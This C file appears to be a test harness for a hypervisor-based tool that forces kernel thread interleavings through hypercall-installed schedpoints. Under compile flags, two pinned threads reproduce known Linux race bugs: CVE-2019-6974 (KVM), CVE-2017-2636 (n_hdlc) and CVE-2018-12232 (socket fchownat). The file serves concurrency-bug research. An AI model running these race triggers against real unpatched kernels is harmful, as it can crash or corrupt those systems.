#define _GNU_SOURCE

#include <err.h>
#include <fcntl.h>
#include <linux/kvm.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <termios.h>
#include <unistd.h>

#ifdef VERBOSE
#define __printf printf
#else
#define __printf(...)                                                          \
    do {                                                                       \
    } while (0)
#endif

// TODO:

enum qcschedpoint_footprint {
    // Not yet handled
    footprint_preserved = 0,
    // The schedpoint was missed. Should be removed from the scheudle
    footprint_missed,
    // The schedpoint was dropped. Should try again.
    footprint_dropped,
    // The schedpoint is hit.
    footprint_hit,
    // The schedpoint is not addressed
    footprint_not_addressed,
};

int fds[2];
int fd0 = -1;
int vm;

#include "hypercall.h"

#define gettid() syscall(SYS_gettid)

#ifdef TEST_KMEMCOV
__thread int fd;
__thread struct kmemcov_access *cover;
#endif

enum kmemcov_access_type {
    KMEMCOV_ACCESS_STORE,
    KMEMCOV_ACCESS_LOAD,
};

struct kmemcov_access {
    unsigned long inst;
    unsigned long addr;
    size_t size;
    enum kmemcov_access_type type;
    uint64_t timestamp;
};

#define KMEMCOV_INIT_TRACE _IO('d', 100)
#define KMEMCOV_ENABLE _IO('d', 101)
#define KMEMCOV_DISABLE _IO('d', 102)
#define COVER_SIZE (64 << 10)

static void set_affinity(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(gettid(), sizeof(set), &set))
        perror("sched_setaffinity");
}

struct schedpoint {
    unsigned long long addr;
    int order;
    enum qcschedpoint_footprint footprint;
};

struct schedpoint sched1[] = {
#ifdef CVE20196974
#include "schedpoint/cve-2019-6974-1.h"
#endif
#ifdef CVE20196974_MINIMAL
#include "schedpoint/cve-2019-6974-minimal-1.h"
#endif
#if defined(SIMPLE_TEST) || defined(SPINLOCK_TEST)
#include "schedpoint/simple-1.h"
#endif
#if defined(BYPASS_TEST) || defined(FOOTPRINT_TEST)
#include "schedpoint/bypass-1.h"
#endif
#if defined(CVE20172636_MINIMAL)
#include "schedpoint/cve-2017-2636-minimal-1.h"
#endif
#if defined(CVE201812232_MINIMAL)
#include "schedpoint/cve-2018-12232-minimal-1.h"
#endif
};

struct schedpoint sched2[] = {
#ifdef CVE20196974
#include "schedpoint/cve-2019-6974-2.h"
#endif
#ifdef CVE20196974_MINIMAL
#include "schedpoint/cve-2019-6974-minimal-2.h"
#endif
#if defined(SIMPLE_TEST) || defined(SPINLOCK_TEST)
#include "schedpoint/simple-2.h"
#endif
#if defined(BYPASS_TEST) || defined(FOOTPRINT_TEST)
#include "schedpoint/bypass-2.h"
#endif
#if defined(CVE20172636_MINIMAL)
#include "schedpoint/cve-2017-2636-minimal-2.h"
#endif
#if defined(CVE201812232_MINIMAL)
#include "schedpoint/cve-2018-12232-minimal-2.h"
#endif
};

static void install_schedpoint(struct schedpoint *sched, int size)
{
    for (int i = 0; i < size; i++) {
        hypercall(HCALL_INSTALL_BP, sched[i].addr, sched[i].order,
                  sched[i].footprint);
    }
    unsigned long ret;
#define EAGAIN 11
    int cnt = 10;
    ret = hypercall(HCALL_ACTIVATE_BP, 0, 0, 0);
    while (ret == -EAGAIN && --cnt) {
        usleep(5 * 1000);
        ret = hypercall(HCALL_ACTIVATE_BP, 0, 0, 0);
    }
}

static void th_init(void *gop)
{
#ifdef TEST_KMEMCOV
    fd = open("/sys/kernel/debug/kmemcov", O_RDWR);
    if (fd == -1)
        perror("open"), exit(1);
    /* Setup trace mode and trace size. */
    if (ioctl(fd, KMEMCOV_INIT_TRACE, COVER_SIZE))
        perror("ioctl"), exit(1);
    /* Mmap buffer shared between kernel- and user-space. */
    cover = (struct kmemcov_access *)mmap(
        NULL, COVER_SIZE * sizeof(struct kmemcov_access),
        PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if ((void *)cover == MAP_FAILED)
        perror("mmap"), exit(1);
#endif
    while (!*(int *)gop)
        ;
#ifdef TEST_KMEMCOV
    /* Enable coverage collection on the current thread. */
    if (ioctl(fd, KMEMCOV_ENABLE, 0))
        perror("ioctl"), exit(1);
#endif
}

static void th_clear()
{
#ifdef TEST_KMEMCOV
    if (ioctl(fd, KMEMCOV_DISABLE, 0))
        perror("ioctl"), exit(1);
    /* Free resources. */
    if (munmap(cover, COVER_SIZE * sizeof(struct kmemcov_access)))
        perror("munmap"), exit(1);
    if (close(fd))
        perror("close"), exit(1);
#endif
}

static bool clear_schedpoint(int idx)
{
    unsigned long long ret = 0;
#ifdef TEST_REPEAT
    struct schedpoint *sched = (idx == 1 ? sched1 : sched2);
#endif
    hypercall(HCALL_DEACTIVATE_BP, 0, 0, 0);
#if defined(FOOTPRINT_TEST) || defined(TEST_REPEAT)
    uint64_t count = 0;
    uint64_t arr[128];
    hypercall(HCALL_FOOTPRINT_BP, (unsigned long)&count, (unsigned long)arr,
              (unsigned long)&ret);
    __printf("retry: %llu\n", ret);
    for (int i = 0; i < count; i++) {
        __printf("  %ld\n", arr[i]);
#ifdef TEST_REPEAT
        sched[i].footprint = arr[i];
#endif
    }
#endif
    hypercall(HCALL_CLEAR_BP, 0, 0, 0);
    return !!ret;
}

static void *th1(void *gop)
{
    bool ret;
    set_affinity(1);
    th_init(gop);
    install_schedpoint(sched1, sizeof(sched1) / sizeof(sched1[0]));
#if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
    struct kvm_create_device cd = {.type = KVM_DEV_TYPE_VFIO,
                                   .fd = -1, // outparm
                                   .flags = 0};
    ioctl(vm, KVM_CREATE_DEVICE, &cd);
#endif
#if defined(CVE20172636_MINIMAL)
    ioctl(fd0, TCXONC, TCOON);
#endif
#if defined(CVE201812232_MINIMAL)
    int r2, r3;
    r2 = getuid();
    r3 = getegid();
    fchownat(fds[0], "", r2, r3, 0x1000);
#endif
#if defined(SIMPLE_TEST) || defined(BYPASS_TEST) || defined(SPINLOCK_TEST) ||  \
    defined(FOOTPRINT_TEST)
    int typ = 1;
#ifdef SPINLOCK_TEST
    typ = 2;
#endif
#define SYS_qcshed_simple_write 509
    syscall(SYS_qcshed_simple_write, typ);
#endif
    ret = clear_schedpoint(1);
    th_clear();
    return (void *)ret;
}

static void *th2(void *gop)
{
    bool ret;
    set_affinity(2);
    th_init(gop);

    install_schedpoint(sched2, sizeof(sched2) / sizeof(sched2[0]));
#if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
    close(fd0);
#endif
#if defined(CVE20172636_MINIMAL)
    ioctl(fd0, TCFLSH, TCIOFLUSH);
#endif
#if defined(CVE201812232_MINIMAL)
    dup3(fds[1], fds[0], 0x80000);
#endif
#if defined(SIMPLE_TEST) || defined(BYPASS_TEST) || defined(SPINLOCK_TEST) ||  \
    defined(FOOTPRINT_TEST)
    int typ = 1;
#ifdef SPINLOCK_TEST
    typ = 2;
#endif
#define SYS_qcshed_simple_read 510
    syscall(SYS_qcshed_simple_read, typ);
#endif
    ret = clear_schedpoint(2);
    th_clear();
    return (void *)ret;
}

#ifdef TEST_REPEAT
static void print_sched(int id, struct schedpoint *sched, int size)
{
    __printf("Sched %d\n", id);
    for (int i = 0; i < size; i++)
        __printf("%llx  %d  %d\n", sched[i].addr, sched[i].order,
                 sched[i].footprint);
}
#endif

static void init()
{
#ifdef TEST_REPEAT
    print_sched(1, sched1, sizeof(sched1) / sizeof(sched1[0]));
    print_sched(2, sched2, sizeof(sched2) / sizeof(sched2[0]));
#endif
#if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
    fd0 = -1;
    int kvm = open("/dev/kvm", O_RDWR);
    if (kvm == -1)
        perror("open");
    vm = ioctl(kvm, KVM_CREATE_VM, 0);
    if (vm == -1)
        perror("KVM_CREATE_VM");
    fd0 = dup(0);
    close(fd0);
#endif
#if defined(CVE20172636_MINIMAL)
    int n_hdlc = N_HDLC;
    char buf[100];
    memset(buf, 'a', 100);
    fd0 = open("/dev/ptmx", O_RDWR);
    ioctl(fd0, TIOCSETD, &n_hdlc);
    ioctl(fd0, TCXONC, TCOOFF);
    write(fd0, buf, 100);
#endif
#if defined(CVE201812232_MINIMAL)
    socketpair(AF_UNIX, SOCK_STREAM, 0x0, fds);
#endif
}

static void fini()
{
#if defined(CVE20172636_MINIMAL)
    close(fd0);
#endif
}

int main(void)
{
    pthread_t pth1, pth2;
    int nr_bps = -1;
    void *ret1, *ret2;

#ifdef TEST_REPEAT
    for (;;) {
#endif
        int go = false;
        set_affinity(0);
        nr_bps = (sizeof(sched1) / sizeof(sched1[0])) +
                 (sizeof(sched2) / sizeof(sched2[0]));
        hypercall(HCALL_RESET, 0, 0, 0);
        hypercall(HCALL_PREPARE, nr_bps, 2, 0);
        hypercall(HCALL_ENABLE_KSSB, 0, 0, 0);

        pthread_create(&pth1, NULL, th1, &go);
        pthread_create(&pth2, NULL, th2, &go);

        usleep(300 * 1000);
        init();
        go = true;

        pthread_join(pth1, &ret1);
        pthread_join(pth2, &ret2);

        fini();

#ifdef TEST_REPEAT
        if ((bool)!ret1 && (bool)!ret2)
            break;
#endif

        hypercall(HCALL_DISABLE_KSSB, 0, 0, 0);
#ifdef TEST_REPEAT
        getchar();
    }
#endif
}
